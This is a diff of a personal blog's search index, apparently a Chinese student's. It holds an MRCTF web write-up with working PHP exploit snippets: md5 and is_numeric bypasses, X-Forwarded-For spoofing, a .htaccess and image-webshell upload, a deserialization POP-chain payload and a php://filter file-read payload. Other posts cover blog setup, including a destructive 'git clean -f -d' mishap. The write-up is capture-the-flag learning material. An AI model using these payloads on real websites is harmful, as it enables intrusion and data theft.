@@ -1,11 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>WUSTCTF2020</title>
-    <url>/2020/04/02/WUSTCTF2020/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>MRCTF复盘</title>
     <url>/2020/03/30/MRCTF/</url>
     <content><![CDATA[<p>周末有两场比赛，WUST和MRCTF，都去看了一下（虽然没咋做题），密码学烦人啊（真滴难），还是在buu复盘有意思</p>
@@ -13,24 +8,24 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure></div>
 
 <p>用数组绕过md5，用数字+字符绕过is_numeric()+弱等于</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">  hash = hex_md5(code);</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p>在源码里发现这段js，这题卡在md5好久。。淦，原来是不用解密的，就是个前端验证，而且还破解不出来md5的值</p>
 <p>直接访问/flag.php</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>构造X-Forwarded-For: 127.0.0.1，得到flag</p>
 <h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>服务器搁美国，给爷整傻了，本来题不是很难，这发包没响应给爷心态搞崩了，后来连上蚁剑后终于知道为啥网站卡了。。</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/3.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>开题一看就知道是老祖安人了</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/4.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>先上传个解析图片为php的.htaccess文件，改一下Content-Type，再传个图片🐎</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/5.png" src="/img/loading.gif" class="lazyload"></a>
 
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/6.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后蚁剑连一下，得到flag</p>
 <h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>第一次遇到反序列化构造pop链的题，还是入门晚了嗷，构造了好久还是不会利用类之间的关系，看了wp才恍然大悟。。</p>
@@ -64,7 +59,7 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Show(<span class="string">'abc'</span>);<span class="comment">//初始化一个Show类</span></span><br><span class="line">$a-&gt;str=<span class="keyword">new</span> Test();<span class="comment">//将str实例化为Test类，访问Test类source变量时调用__get()</span></span><br><span class="line">$b=<span class="keyword">new</span> Show($a);<span class="comment">//令$this-&gt;source等于Show类，类$a被当成字符串的形式执行，从而调用__toString()</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></div>
 
 <p>base64解码后得到flag</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>简单Bypass、伪协议、jsfuck</p>
 <p>F12发现以下源码</p>
@@ -81,17 +76,16 @@
 <p>且传入的<code>file</code>变量要经过<code>change</code>加密，所以传入一个加密的伪协议或者文件名进行文件包含。</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    $rc=base64_encode($re);</span><br><span class="line">    <span class="keyword">return</span> $rc;</span><br><span class="line">&#125;</span><br><span class="line">$v=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="comment">//得到结果进行base64解码得到flag</span></span><br><span class="line"><span class="comment">//或者$v="flag.php";然后查看源码得到flag</span></span><br><span class="line">$a=rechange($v);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>
 
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>源码泄露、伪随机数、基础SQL</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/30/MRCTF/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
       <categories>
         <category>Write_up</category>
-        <category>Web</category>
       </categories>
       <tags>
         <tag>Write_up</tag>
@@ -360,7 +354,6 @@
 ]]></content>
       <categories>
         <category>Write_up</category>
-        <category>misc</category>
       </categories>
       <tags>
         <tag>Write_up</tag>
@@ -379,7 +372,7 @@
 <p>此时问题出现了，网站内容没更新！！！</p>
 <p>再刷新几次试试。。。还是没有！！！！</p>
 <p>回来再部署一次！一定是姿势不对！</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/5.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="10%" height="10%" data-src="/2020/03/07/A-painful-experience/5.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>淦！！为啥还是没有，研究一下hexo d之后的内容。。</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”？？？？？？</p>
@@ -389,25 +382,25 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clean -f -d</span><br></pre></td></tr></table></figure></div>
 
 <p>就是它！！就是它！！它摧毁了我的hexo，它删掉了我辛辛苦苦配置了很久的next和butterfly</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/1.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/1.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>第一反应woc！！！赶紧去回收站看看，有救没？？有救没？？？</p>
 <p>没有了！！！5555草5555！！！</p>
 <p>于是悲伤地卸掉hexo打算重新来过</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/3.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/03/07/A-painful-experience/3.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>但是再下下来后，发现hexo s连TM自己本地的4000端口都看不来了！！（急了急了脑子没了</p>
 <p>那时候已经一点多了，我悲伤地发出了一篇纪念我短暂博客生涯的说说</p>
 <p>那时已经在看Ghost怎么搭建了（但是说真的还是放不下hexo，作业那么多，也没有重头再来的勇气了</p>
 <p>这时一位学姐的评论，又让我看到blog转生的希望</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/4.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/4.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>DiskGenius文件数据恢复工具，然后就去扫我的磁盘</p>
 <p>但是有用的只找到了一部分，很多都丢了（像styl文件、yml文件</p>
 <p>比较惊喜的还是把自己之前发博客写的md文件找到了（很重要，没这个我贼难受，懒得copy了</p>
 <p>这时时间来到了3点多钟，我不甘心的睡下了，仿佛看开了，其实脑子里全都是</p>
 <p>“Branch ‘master’ set up to track remote branch ‘master’ from”。。。。。。。。。</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/6.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/6.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>时间来到了今天，早上爬起来水了道战疫的misc后。。</p>
 <p>淦！我不甘心！爷要从头开始！！！（md，要不是这事，我OS实验一应该写的差不多了</p>
@@ -415,11 +408,11 @@
 <p>hexo clean g d。。！！？？还是之前的样子？？？？</p>
 <p>这次又去研究了下分叉，切到.deploy<code>git branch -a</code>。。。就一个master呀</p>
 <p><code>ssh -v git@xx.xx.xx.xx</code>在服务器里切到blog.git。。。就一个master呀</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/7.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="15%" height="15%" data-src="/2020/03/07/A-painful-experience/7.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>WinSCP连上服务器，看一下文件更新时间？？是今天下午啊！没错呀！</p>
 <p>此时的我意识到了问题的不对劲</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/8.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="20%" height="20%" data-src="/2020/03/07/A-painful-experience/8.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>每次在Edge进博客进得都很快，我知道可能是有缓存之类的，但是清除缓存后好像没并没有什么卵用</p>
 <p>于是我打算换一个浏览器进入一下我的博客（  Firefox启动，Google启动</p>
@@ -428,7 +421,7 @@
 <p>我突然想到了我昨天下午搞的骚东西——CDN，好像没搞完就放那不管了</p>
 <p>接下来我发现我的域名解析暂停了没开，CDN暂停了没删</p>
 <p>真相只有一个</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/03/07/A-painful-experience/9.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/07/A-painful-experience/9.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <p>Edge是个 随便！！（好吧，其实是我菜，但是edge浏这个览器连我域名没开解析都能进去的机制属实恶心</p>
 <p>还有就是为啥我拿dl进去是更新的状态，自己的ip却不更新的（我咋觉得还跟上次扫目录有关。。</p>
@@ -457,7 +450,7 @@
 <h5 id="事件记录"><a href="#事件记录" class="headerlink" title="事件记录"></a>事件记录</h5><p>curl太慢（卡着卡着停了）、python2退休（确实不方便）、pip安装不成功</p>
 <p>权限赋予 chmod、教程没啥说的下面挺全</p>
 <p>学习过程再更，（众所周知，安装≈学会）</p>
-<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload" title></a></p>
+<p><a href="/2020/03/02/Docker-learning/t.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2020/03/02/Docker-learning/t.jpg" src="/img/loading.gif" class="lazyload"></a></p>
 <h5 id="相关网址："><a href="#相关网址：" class="headerlink" title="相关网址："></a>相关网址：</h5><p><a href="https://blog.csdn.net/deng624796905/article/details/86493330" target="_blank" rel="noopener">Docker入门</a></p>
 <p><a href="https://blog.csdn.net/zzq060143/article/details/91050272" target="_blank" rel="noopener">Win10中docker的安装与使用</a></p>
 <p><a href="https://blog.csdn.net/weixin_44725156/article/details/104403204" target="_blank" rel="noopener">Centos7安装Docker Compose(pip方式安装)</a></p>
@@ -506,7 +499,7 @@
 
 <p>换成淘宝的源会好很多</p>
 <h3 id="自定义配置文件"><a href="#自定义配置文件" class="headerlink" title="自定义配置文件"></a>自定义配置文件</h3><p>如果想自定义一些自己的样式，而你的版本恰是Next7.X的话（目前最新的Next）。你会发现很多文章中提及的custom文件（可以自由编辑样式的一个文件）没有了。这时你可以在根目录下的source文件下面新建一个_data文件夹，然后在里面新建建一个styles.styl，并在主题配置里设置一下（如下图），这样你就可以在里面加一些自定义的代码了。</p>
-<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/2020/02/15/My-first/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img style="zoom:80%;" data-src="/2020/02/15/My-first/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 
 
